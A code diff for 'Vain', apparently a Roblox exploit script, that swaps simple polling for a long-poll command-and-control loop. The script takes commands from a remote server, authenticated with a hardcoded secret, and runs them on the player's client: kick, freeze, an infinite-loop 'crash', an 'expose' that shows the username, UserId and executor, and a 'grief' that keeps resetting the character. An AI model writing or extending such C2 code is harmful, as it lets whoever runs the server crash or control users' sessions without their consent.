@@ -234,33 +234,24 @@ local API_SECRET = 'bf5d6650662b48a72a979e7cea9b97edd5170401dd99a50b'
 local vainTier     = 0
 local vainTierName = 'Free'
 
-local function apiGet(path)
-	local ok, res = pcall(function()
-		return game:HttpGet(API_URL..path, true)
-	end)
-	return ok and res or nil
-end
+local httpRequest = (syn and syn.request) or (http and http.request) or request
 
-local function apiGetAuthed(path)
-	-- HttpGet doesn't support custom headers in most executors; use HttpRequest if available
-	if syn and syn.request then
-		local ok, res = pcall(syn.request, { Url = API_URL..path, Method = 'GET', Headers = { ['x-vain-secret'] = API_SECRET } })
-		return ok and res and res.Body or nil
-	elseif (http and http.request) then
-		local ok, res = pcall(http.request, { Url = API_URL..path, Method = 'GET', Headers = { ['x-vain-secret'] = API_SECRET } })
-		return ok and res and res.Body or nil
-	elseif request then
-		local ok, res = pcall(request, { Url = API_URL..path, Method = 'GET', Headers = { ['x-vain-secret'] = API_SECRET } })
-		return ok and res and res.Body or nil
-	end
-	return apiGet(path)
+local function apiRequest(method, path, body)
+	if not httpRequest then return nil end
+	local ok, res = pcall(httpRequest, {
+		Url     = API_URL .. path,
+		Method  = method,
+		Headers = { ['x-vain-secret'] = API_SECRET, ['Content-Type'] = 'application/json' },
+		Body    = body,
+	})
+	return ok and res and res.Body or nil
 end
 
 local function executeCommand(command, args)
-	local lp = playersService.LocalPlayer
+	local lp   = playersService.LocalPlayer
 	local char = lp.Character
-	local hrp = char and char:FindFirstChild('HumanoidRootPart')
-	local hum = char and char:FindFirstChildOfClass('Humanoid')
+	local hrp  = char and char:FindFirstChild('HumanoidRootPart')
+	local hum  = char and char:FindFirstChildOfClass('Humanoid')
 
 	if command == 'kick' then
 		lp:Kick('[Vain] You have been kicked.')
@@ -270,17 +261,15 @@ local function executeCommand(command, args)
 		task.spawn(function()
 			local end_t = tick() + 30
 			while tick() < end_t and hrp do
-				hrp.Velocity        = Vector3.zero
-				hrp.RotVelocity     = Vector3.zero
-				hrp.Anchored        = true
+				hrp.Velocity    = Vector3.zero
+				hrp.RotVelocity = Vector3.zero
+				hrp.Anchored    = true
 				task.wait(0.1)
 			end
 			if hrp then hrp.Anchored = false end
 		end)
 	elseif command == 'crash' then
-		task.spawn(function()
-			while true do end
-		end)
+		task.spawn(function() while true do end end)
 	elseif command == 'expose' then
 		local info = lp.Name..' | '..tostring(lp.UserId)..' | '..(identifyexecutor and identifyexecutor() or 'unknown executor')
 		if vain then vain:CreateNotification('Exposed', info, 15, 'alert') end
@@ -313,7 +302,6 @@ local function executeCommand(command, args)
 			end
 		end)
 	elseif command == 'grief' then
-		-- reset character repeatedly
 		task.spawn(function()
 			local end_t = tick() + 30
 			while tick() < end_t do
@@ -326,22 +314,23 @@ local function executeCommand(command, args)
 	end
 end
 
-local function startC2Polling()
-	local lp = playersService.LocalPlayer
-	local username = lp and lp.Name
-	if not username then return end
+-- Long-poll: server holds the connection open up to 25s and responds the
+-- instant a command is queued. We reconnect immediately after each response,
+-- so latency is ~500ms worst case instead of up to 5s.
+local function startC2LongPoll()
+	local username = playersService.LocalPlayer.Name
 	task.spawn(function()
 		while vain and vain.Loaded do
-			local body = apiGetAuthed('/commands?username='..username)
+			local body = apiRequest('GET', '/commands/poll?username=' .. username)
 			if body then
 				local ok, data = pcall(httpService.JSONDecode, httpService, body)
-				if ok and data and data.commands then
-					for _, cmd in ipairs(data.commands) do
-						pcall(executeCommand, cmd.command, cmd.args)
-					end
+				if ok and data and data.command then
+					pcall(executeCommand, data.command, data.args)
 				end
+			else
+				-- Request failed (no httpRequest available or network error) — back off
+				task.wait(5)
 			end
-			task.wait(5)
 		end
 	end)
 end
@@ -382,7 +371,7 @@ local function finishLoading()
 			task.wait(10)
 		until not vain.Loaded
 	end)
-	startC2Polling()
+	startC2LongPoll()
 
 	local teleportedServers
 	vain:Clean(playersService.LocalPlayer.OnTeleport:Connect(function(state)
